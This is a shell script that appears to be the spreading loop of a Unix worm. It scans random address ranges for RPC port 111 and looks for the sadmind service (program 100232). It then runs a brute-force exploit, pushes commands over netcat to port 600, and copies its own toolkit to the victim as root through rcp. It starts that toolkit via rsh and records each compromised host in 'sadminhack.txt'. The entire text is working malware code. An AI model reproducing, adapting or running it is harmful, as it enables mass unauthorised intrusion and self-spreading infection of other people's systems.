#!/bin/sh
while true 
do
i=`/usr/local/bin/perl /dev/cuc/ranip.pl`
j=0
while [ $j -lt 256 ];do
/dev/cuc/grabbb -t 3 -a $i.$j.1 -b $i.$j.50 111 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.51 -b $i.$j.100 111 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.101 -b $i.$j.150 111 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.151 -b $i.$j.200 111 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.201 -b $i.$j.254 111 >> /dev/cub/$i.txt
j=`/bin/echo "$j+1"|/bin/bc`
done 
iplist=`/bin/awk -F: '{print $1}' /dev/cub/$i.txt`
for ip in $iplist;do
/bin/rpcinfo -p $ip > /dev/cub/$i.rpc.txt
/bin/grep 100232 /dev/cub/$i.rpc.txt >/dev/null 2>&1
if [ $? = 0 ];then
/dev/cuc/brute 3 $ip >/dev/null 2>&1
if [ $? = 0 ];then
/bin/cat /dev/cuc/cmd1.txt|/dev/cuc/nc $ip 600 >/dev/null 2>&1
/bin/tar -cvf /tmp/uni.tar /dev/cuc
/bin/rcp /tmp/uni.tar root@$ip:/tmp/uni.tar >/dev/null 2>&1
if [ $? = 0 ];then
/bin/cat /dev/cuc/cmd2.txt|/dev/cuc/nc $ip 600 >/dev/null 2>&1
/bin/rsh -l root $ip /etc/rc2.d/S71rpc >/dev/null 2>&1 & 
/bin/echo $ip >> /dev/cub/sadminhack.txt
/bin/rm -f /tmp/uni.tar 
fi
else
/dev/cuc/brute 4 $ip >/dev/null 2>&1
if [ $? = 0 ];then
/bin/cat /dev/cuc/cmd1.txt|/dev/cuc/nc $ip 600 >/dev/null 2>&1
/bin/tar -cvf /tmp/uni.tar /dev/cuc
/bin/rcp /tmp/uni.tar root@$ip:/tmp/uni.tar >/dev/null 2>&1
if [ $? = 0 ];then
/bin/cat /dev/cuc/cmd2.txt|/dev/cuc/nc $ip 600 >/dev/null 2>&1
/bin/rsh -l root $ip /etc/rc2.d/S71rpc >/dev/null 2>&1 & 
/bin/echo $ip >> /dev/cub/sadminhack.txt
/bin/rm -f /tmp/uni.tar
fi
fi
fi
fi
/bin/rm -f /dev/cub/$i.rpc.txt
done
/bin/rm -f /dev/cub/$i.txt
done
